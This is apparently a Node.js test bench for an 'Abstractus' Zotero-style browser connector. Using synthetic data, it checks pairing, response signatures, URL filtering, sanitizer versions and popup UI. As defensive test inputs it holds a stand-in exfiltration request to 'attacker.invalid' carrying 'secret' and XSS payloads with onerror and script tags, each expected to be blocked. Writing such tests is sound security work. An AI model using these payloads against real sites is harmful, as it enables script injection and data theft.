// Development only. Real Rust HTTP transport + the shipped JS broker, synthetic data.
import fs from 'node:fs/promises';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import {spawn} from 'node:child_process';
import vm from 'node:vm';
import assert from 'node:assert/strict';
import {webcrypto} from 'node:crypto';
import {indexedDB} from 'fake-indexeddb';
import puppeteer from 'puppeteer';
const root=path.resolve(path.dirname(fileURLToPath(import.meta.url)),'..');
const desktop=path.resolve(process.env.ABSTRACTUS_DESKTOP_FRONTEND || path.join(root,'../../AbstractusDesktop/AbstractusTSX_1.0.0/Frontend'));
const results=path.join(root,'.test-results');await fs.mkdir(results,{recursive:true});
const fixtureFile=path.join(results,`fixture-${webcrypto.randomUUID()}.json`);
const tests=[];
async function test(name,action){await action();tests.push(name);console.log('PASS',name);}
const uiOnly=process.argv.includes('--ui-only');
const child=uiOnly ? null : spawn('cargo',['test','--manifest-path',path.join(desktop,'src-tauri/Cargo.toml'),'--lib','bench_fixture','--','--ignored'],{cwd:desktop,env:{...process.env,ABSTRACTUS_BENCH_FIXTURE:fixtureFile},windowsHide:true,stdio:['ignore','pipe','pipe']});
let output='';child?.stdout.on('data',b=>output+=b);child?.stderr.on('data',b=>output+=b);
let exited=false;const completed=child?new Promise(resolve=>{child.on('error',e=>{output+=e.message;exited=true;resolve();});child.on('exit',()=>{exited=true;resolve();});}):Promise.resolve();
let browser;
try {
 let fixture;
 if(!uiOnly){
 const deadline=Date.now()+120000;
 while(Date.now()<deadline){try{fixture=JSON.parse(await fs.readFile(fixtureFile,'utf8'));break;}catch{if(exited)throw new Error(output);await new Promise(r=>setTimeout(r,100));}}
 assert(fixture,'Native fixture did not start');
 let receive;
 const context=vm.createContext({Zotero:{},browser:{runtime:{id:'abstractus-test',getURL:p=>'chrome-extension://abstractus-test/'+p,onMessage:{addListener:f=>{receive=f;}}}},indexedDB,crypto:webcrypto,TextEncoder,TextDecoder,Uint8Array,ArrayBuffer,Blob,URL,Headers,AbortController,fetch,setTimeout,clearTimeout,console});
 const source=(await fs.readFile(path.join(root,'src/common/secure-connector.js'),'utf8')).replaceAll('127.0.0.1:23130',`127.0.0.1:${fixture.port}`);
 vm.runInContext(source,context); // Test-only address substitution; production source has no override.
 const sender={id:'abstractus-test',url:'chrome-extension://abstractus-test/preferences/preferences.html'};
 const uri=route=>`http://127.0.0.1:${fixture.port}/connector/${route}`;
 const send=(route,data)=>context.Zotero.AbstractusTransport.request('POST',uri(route),{headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
 await test('Unpaired broker cannot read the library',()=>assert.rejects(()=>send('getSelectedCollection',{})));
 await test('Web page cannot install pairing credentials',()=>assert.rejects(()=>receive({type:'abstractus-pair',action:'connect',code:fixture.code},{id:'abstractus-test',url:'https://example.org'})));
 await test('Real JS/Rust handshake authenticates both sides',async()=>assert.equal((await receive({type:'abstractus-pair',action:'connect',code:fixture.code},sender)).connected,true));
 await test('Metadata query verifies the native response signature',async()=>assert.equal((await send('getSelectedCollection',{})).status,200));
 await test('Save a reference with abstract through the real transport',async()=>assert.equal((await send('saveItems',{sessionID:'bench',items:[{id:'paper',title:'Synthetic bench reference',abstractNote:'Synthetic abstract',DOI:'10.0000/abstractus-bench'}]})).status,201));
 await test('Tags save through the paired session',async()=>assert.equal((await send('updateSession',{sessionID:'bench',tags:['Bench tag']})).status,200));
 await test('PDF attachment reaches only the synthetic native library',async()=>{
  const response=await context.Zotero.AbstractusTransport.request('POST',uri('saveAttachment?sessionID=bench'),{headers:{'Content-Type':'application/pdf','X-Metadata':JSON.stringify({parentItemID:'paper',title:'Synthetic PDF',contentType:'application/pdf'})},body:'%PDF-1.4\nSynthetic bench only\n%%EOF'});assert.equal(response.status,201);
 });
 await test('Foreign destinations are rejected before fetch',()=>assert.rejects(()=>context.Zotero.AbstractusTransport.request('POST','https://attacker.invalid/connector/saveItems',{body:'secret'})));
 await test('Impersonated desktop cannot receive a paper',async()=>{
  const original=context.fetch;const requests=[];
  context.fetch=async (url,options)=>{requests.push({url:String(url),body:options.body});return new Response('{}',{status:200,headers:{'X-Abstractus-Proof':'00'.repeat(32)}});};
  try{await assert.rejects(()=>send('saveItems',{items:[{title:'Never transmit'}]}));assert.equal(requests.length,1);assert(requests[0].url.endsWith('/handshake'));assert.equal(requests[0].body,undefined);}finally{context.fetch=original;}
 });
 await test('Disconnect removes the broker credential',async()=>{await receive({type:'abstractus-pair',action:'disconnect'},sender);await assert.rejects(()=>send('getSelectedCollection',{}));});
 vm.runInContext(await fs.readFile(path.join(root,'src/common/network-policy.js'),'utf8'),context);
 await test('Translator callbacks cannot invoke generic RPC or broadcast',async()=>{context.Zotero.AbstractusNetwork.callback(['Translate.onHandler.itemSaving',[],1,0]);for(const args of [['Prefs.getAll',[],1,0],['Connector.saveItems',[],1,0],['Translate.onHandler.itemSaving',[],-1,0]])assert.throws(()=>context.Zotero.AbstractusNetwork.callback(args));});
 await test('Translator bridge permits its own packaged resources',async()=>{assert.equal(context.Zotero.AbstractusNetwork.validate('chrome-extension://abstractus-test/utilities/resource/dateFormats.json'),'chrome-extension://abstractus-test/utilities/resource/dateFormats.json');assert.throws(()=>context.Zotero.AbstractusNetwork.validate('chrome-extension://another-extension/private.json'));});
 await test('Translator bridge rejects local/private literal destinations',async()=>{for(const url of ['http://127.0.0.1/','https://127.0.0.1/','https://[::1]/','https://localhost/','https://host.internal/','https://192.168.1.1/','https://publisher.org:8443/'])assert.throws(()=>context.Zotero.AbstractusNetwork.validate(url));assert.equal(context.Zotero.AbstractusNetwork.validate('https://pubmed.ncbi.nlm.nih.gov/1/'),'https://pubmed.ncbi.nlm.nih.gov/1/');});
 }
 if(fixture){
  // A disposable copy keeps the user's loaded extension and port 23130 untouched.
  const runtimeBuild=path.join(root,'.test-build',webcrypto.randomUUID());
  await fs.cp(path.join(root,'build/manifestv3'),runtimeBuild,{recursive:true});
  for(const file of ['secure-connector.js','zotero_config.js']){
   const location=path.join(runtimeBuild,file);
   await fs.writeFile(location,(await fs.readFile(location,'utf8')).replaceAll('127.0.0.1:23130',`127.0.0.1:${fixture.port}`));
  }
  let runtimeBrowser;
  try {
   runtimeBrowser=await puppeteer.launch({headless:true,args:[`--disable-extensions-except=${runtimeBuild}`,`--load-extension=${runtimeBuild}`]});
   const target=await runtimeBrowser.waitForTarget(t=>t.type()==='service_worker'&&t.url().endsWith('background-worker.js'),{timeout:15000});
   const worker=await target.worker();
   worker.on('console',message=>{if(message.type()==='error')console.error('Extension runtime:',message.text());});
   await worker.evaluate(()=>Promise.race([Zotero.initDeferred.promise,new Promise((_,reject)=>setTimeout(()=>reject(new Error('Extension initialization exceeded 25 seconds')),25000))]));
   const base=target.url().replace('background-worker.js','');
   const settings=await runtimeBrowser.newPage();await settings.goto(base+'preferences/preferences.html');
   await test('Installed production extension pairs through its real settings sender',async()=>{
    const result=await settings.evaluate(code=>browser.runtime.sendMessage({type:'abstractus-pair',action:'connect',code}),fixture.code);
    assert.equal(result.connected,true);
   });
   await test('Installed extension reads collections through the real Connector adapter',async()=>{
    const result=await worker.evaluate(()=>Zotero.Connector.callMethod('getSelectedCollection',{}));
    assert.equal(result.libraryName,'Abstractus Library');
   });
   const translatorSource=await fs.readFile(path.join(root,'src/zotero/translators/Embedded Metadata.js'),'utf8');
   const translatorMetadata=JSON.parse(/^\s*{[\S\s]*?}\s*?[\r\n]/.exec(translatorSource)[0]);
   await worker.evaluate(async ({metadata,code})=>{
    await Zotero.Translators.init();
    Zotero.Translators._load([metadata]);
    await Zotero.Prefs.set(Zotero.Translators.PREFS_TRANSLATOR_CODE_PREFIX+metadata.translatorID,code);
   },{metadata:translatorMetadata,code:translatorSource});
   await test('Installed extension translates a synthetic publisher page through its sandbox',async()=>{
    const paper=await runtimeBrowser.newPage();await paper.setRequestInterception(true);
    paper.on('request',request=>request.url().startsWith('https://bench.example.org/')?request.respond({status:200,contentType:'text/html',body:'<!doctype html><html><head><title>Synthetic research paper</title><meta name="citation_title" content="Synthetic research paper"><meta name="citation_author" content="Test, Alex"><meta name="citation_journal_title" content="Fixture Journal"><meta name="citation_date" content="2026"><meta name="DC.description" content="An isolated synthetic abstract."></head><body>Synthetic publisher fixture</body></html>'}):request.continue());
    await paper.goto('https://bench.example.org/paper');
    const tab=await worker.evaluate(async()=> (await browser.tabs.query({url:'https://bench.example.org/paper'}))[0]);
    assert(tab);
    const deadline=Date.now()+15000;let detected=false;
    while(Date.now()<deadline){detected=await worker.evaluate(id=>Boolean(Zotero.Connector_Browser._tabInfo[id]?.translators?.length),tab.id);if(detected)break;await new Promise(r=>setTimeout(r,100));}
    assert(detected,'Embedded Metadata translator did not detect the synthetic page');
    await worker.evaluate(tab=>Zotero.Connector_Browser.saveWithTranslator(tab,0),tab);
    const saveDeadline=Date.now()+15000;let saved;
    while(Date.now()<saveDeadline){
     try{const rows=JSON.parse(await fs.readFile(fixtureFile+'.library.json','utf8'));saved=rows.find(row=>row.title==='Synthetic research paper');if(saved)break;}catch{}
     await new Promise(r=>setTimeout(r,100));
    }
    assert(saved,'The translated paper never reached the disposable native database');
    assert(saved.authors.includes('Alex'));assert(saved.abstract_text.includes('synthetic abstract'));

    await paper.close();
   });
   await test('Installed extension saves an abstract through the real Connector adapter',async()=>{
    const result=await worker.evaluate(()=>Zotero.Connector.callMethod('saveItems',{sessionID:'runtime',items:[{id:'runtime-paper',title:'Disposable runtime reference',abstractNote:'Synthetic abstract'}]}));
    assert(result);
   });
  } finally {if(runtimeBrowser)await runtimeBrowser.close();await fs.rm(runtimeBuild,{recursive:true,force:true,maxRetries:3,retryDelay:200});}
 }
 browser=await puppeteer.launch({headless:true});const page=await browser.newPage();page.setDefaultTimeout(7000);
 const build=path.join(root,'build/manifestv3');
 const css=await fs.readFile(path.join(build,'progressWindow/progressWindow.css'),'utf8');
 await page.setViewport({width:420,height:650,deviceScaleFactor:1});
 await page.setContent('<div id="progress-window"></div><div id="messageAlert"></div><style>'+css+'</style>');
 for(const file of ['lib/react.js','lib/react-dom.js','lib/react-dom-factories.js','lib/prop-types.js'])await page.addScriptTag({path:path.join(build,file)});
 await page.evaluate(()=>{window.Zotero={UI:{},getString:(key,args)=>key==='general_done'?'Done':key==='progressWindow_tagPlaceholder'?'Add tags':key==='progressWindow_filterPlaceholder'?'Filter collections':String(args||key),Connector:{getPref:async()=>true},Messaging:{addMessageListener:()=>{},sendMessage:async()=>{}},getExtensionURL:p=>p,Utilities:{}};window.ZOTERO_CONFIG={CLIENT_NAME:'Abstractus'};});
 await page.addScriptTag({path:path.join(build,'ui/tree/tree.js')});
 await page.addScriptTag({path:path.join(build,'ui/ProgressWindow.js')});
 await page.evaluate(()=>{
  const instance=ReactDOM.render(React.createElement(Zotero.UI.ProgressWindow),document.getElementById('progress-window'));
  window.benchProgress=instance;instance.sendMessage=()=>{};
  instance.changeHeadline('Saving to',{id:'C1',name:'Literature review',filesEditable:true},[{id:'L1',name:'Abstractus Library',level:0,filesEditable:true},{id:'C1',name:'Literature review',level:1,filesEditable:true}],{L1:['Clinical studies','Long term follow up','Methods','Randomized trials','Screening','Systematic reviews','Treatment outcomes']});
  instance.setState({targetSelectorShown:true});instance.onTargetChange('C1');
 });
 await page.waitForSelector('.ProgressWindow-tagsInput');await page.focus('.ProgressWindow-tagsInput');
 await test('Tags dropdown has readable rows and stays inside the viewport',async()=>{
  await page.waitForSelector('#tags-autocomplete');
  const layout=await page.evaluate(()=>{const box=document.querySelector('#tags-autocomplete').getBoundingClientRect(),row=document.querySelector('[role="option"]').getBoundingClientRect();return {width:box.width,height:box.height,top:box.top,bottom:box.bottom,row:row.height,viewport:innerHeight};});
  assert(layout.width>=280,JSON.stringify(layout));assert(layout.row>=34,JSON.stringify(layout));assert(layout.top>=0&&layout.bottom<=layout.viewport,JSON.stringify(layout));assert(layout.height>=140,JSON.stringify(layout));
 });
 await test('Tags support keyboard selection',async()=>{await page.keyboard.press('ArrowDown');await page.keyboard.press('Enter');assert(await page.$('.ProgressWindow-selectedTag'));});
 await test('Hostile translator names render as inert text',async()=>{await page.evaluate(()=>{window.benchProgress.setState({errors:[['fallback','<img src=x onerror="window.pwned=1">','<script>window.pwned=1</script>']]});});assert.equal(await page.evaluate(()=>window.pwned),undefined);assert.equal(await page.$$eval('.ProgressWindow-errors img,.ProgressWindow-errors script',n=>n.length),0);});
 await page.evaluate(()=>window.benchProgress.setState({errors:[]}));
 const logo='data:image/png;base64,'+(await fs.readFile(path.join(build,'images/abstractus-logo.png'))).toString('base64');
 await page.evaluate(logo=>{for(const img of document.images)if(img.classList.contains('ProgressWindow-brandLogo'))img.src=logo;},logo);
 await test('Popup displays the shipped Abstractus logo',async()=>{await page.waitForFunction(()=>document.querySelector('.ProgressWindow-brandLogo')?.naturalWidth>0);});
 await page.focus('.ProgressWindow-tagsInput');
 await page.emulateMediaFeatures([{name:'prefers-color-scheme',value:'light'}]);
 await page.screenshot({path:path.join(results,'connector-tags.png')});
 await page.emulateMediaFeatures([{name:'prefers-color-scheme',value:'dark'}]);
 await page.screenshot({path:path.join(results,'connector-tags-dark.png')});
 for(const browser of ['manifestv3','firefox']) {
  await test(`${browser} release excludes test pages and ships patched sanitizer`,async()=>{
   const dir=path.join(root,'build',browser);await assert.rejects(()=>fs.access(path.join(dir,'test')));await assert.rejects(()=>fs.access(path.join(dir,'tools')));
   const purify=await fs.readFile(path.join(dir,'lib/dompurify.js'),'utf8');assert(!purify.includes('DOMPurify 3.2.5'));assert(purify.includes('DOMPurify 3.4.15'));
   const transport=await fs.readFile(path.join(dir,'secure-connector.js'),'utf8');if(fixture)assert(!transport.includes(String(fixture.port)));assert(transport.includes('127.0.0.1:23130'));
  });
 }
 await fs.writeFile(path.join(results,'bench.json'),JSON.stringify({passed:tests.length,tests,syntheticOnly:true},null,2));
 console.log(`Connector bench: ${tests.length} passed. No user browser or library was used.`);
} finally {
 if(browser)await browser.close();if(child)await fs.writeFile(fixtureFile+'.stop','stop');
 await Promise.race([completed,new Promise(r=>setTimeout(r,10000))]);
 await fs.writeFile(path.join(results,'native-fixture.log'),output);
 if(child&&!exited) child.kill();
}
